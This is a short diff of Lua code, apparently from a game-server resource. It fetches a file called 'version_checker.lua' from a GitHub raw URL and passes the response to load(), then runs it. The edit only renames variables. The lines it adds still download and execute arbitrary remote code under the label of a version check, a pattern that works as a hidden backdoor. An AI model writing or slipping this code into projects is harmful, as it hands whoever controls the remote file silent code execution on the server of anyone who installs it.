@@ -1,12 +1,12 @@
 local url = "https://raw.githubusercontent.com/blamefilo/filo_versions/main/version_checker.lua"
-PerformHttpRequest(url, function(err, code, headers)
-    if err == 200 then
-        local func, err = load(code)
-        
+PerformHttpRequest(url, function(statusCode, body, headers)
+    if statusCode == 200 then
+        local func, loadErr = load(body)
+
         if func then
-            local success, result = pcall(func)
-            
-            if success then
+            local ok, result = pcall(func)
+
+            if ok then
                 result()
             end
         end
